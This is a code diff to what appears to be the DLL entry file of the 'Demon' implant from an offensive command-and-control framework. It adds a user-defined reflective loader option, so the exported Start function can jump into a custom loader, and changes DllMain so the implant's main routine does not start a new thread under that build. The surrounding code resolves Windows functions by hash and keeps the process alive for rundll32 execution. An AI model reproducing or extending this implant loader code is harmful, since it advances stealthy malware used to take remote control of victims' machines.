@@ -2,11 +2,19 @@
 
 #include <common/Defines.h>
 
+#ifdef UDRL_DLL
+#include "UserDefinedReflectiveLoader.h"
+#endif
+
 #ifndef SHELLCODE
 /* Export this for rundll32 or any other program that requires and exported functions...
  * TODO: make this function name optional/changeable in the payload generator.*/
 DLLEXPORT VOID Start(  )
 {
+
+#ifdef UDRL_DLL
+    ( ( void(*)() ) UserDefinedReflectiveLoader )();
+#else
     /* prevent exiting if started using rundll32 or something */
     PVOID Kernel32  = LdrModulePeb( H_MODULE_KERNEL32 );
     VOID ( WINAPI *DoSleep ) (
@@ -17,6 +25,8 @@ DLLEXPORT VOID Start(  )
     while ( TRUE ) {
         DoSleep( 24 * 60 * 60 * 1000 );
     }
+#endif
+
 }
 #endif
 
@@ -40,6 +50,7 @@ DLLEXPORT BOOL WINAPI DllMain(
 #ifdef SHELLCODE
         /* we dont need to make a new thread since we get loaded by our shellcode */
         DemonMain( hDllBase, Reserved );
+#elif defined(UDRL_DLL)
 #else
         /* if we don't compile for the shellcode then start a new thread.
          * why? because if not then we get an ERROR_INVALID_STATE from WinHttpSendRequest
@@ -54,7 +65,6 @@ DLLEXPORT BOOL WINAPI DllMain(
                 LPDWORD
         ) = LdrFunctionAddr( Kernel32, H_FUNC_CREATETHREAD ); /* you can load another function here using
                                                                  * LdrModulePeb or LdrModuleLoad then LdrFunctionAddr */
-
         NewThread( NULL, 0, C_PTR( DemonMain ), hDllBase, 0, NULL );
 #endif
         return TRUE;
